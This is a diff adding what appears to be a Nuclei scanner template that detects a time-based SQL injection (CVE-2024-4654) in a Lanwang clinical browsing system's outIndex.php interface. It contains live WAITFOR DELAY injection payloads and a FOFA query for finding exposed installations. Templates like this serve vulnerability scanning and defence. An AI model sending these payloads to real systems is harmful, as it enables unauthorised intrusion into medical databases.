@@ -1,0 +1,25 @@
+id: lanwang-clinical-sqli-outindex
+info:
+  name: "蓝网科技临床浏览系统outIndex接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="LANWON-临床浏览系统"
+      蓝网科技临床浏览系统在outIndex接口的参数处理逻辑中存在SQL注入缺陷，攻击者可通过构造恶意SQL语句实现对数据库的未授权操作，包括但不限于数据篡改、删除或注入恶意记录，从而导致数据完整性受损或服务中断。
+  reference:
+  - CVE-2024-4654
+  tags: 蓝网科技临床浏览系统
+http:
+- raw:
+  - |
+    GET /xds/outIndex.php?appuser=1&name=1%22%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /xds/outIndex.php?appuser=1&name=1%22%27;WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
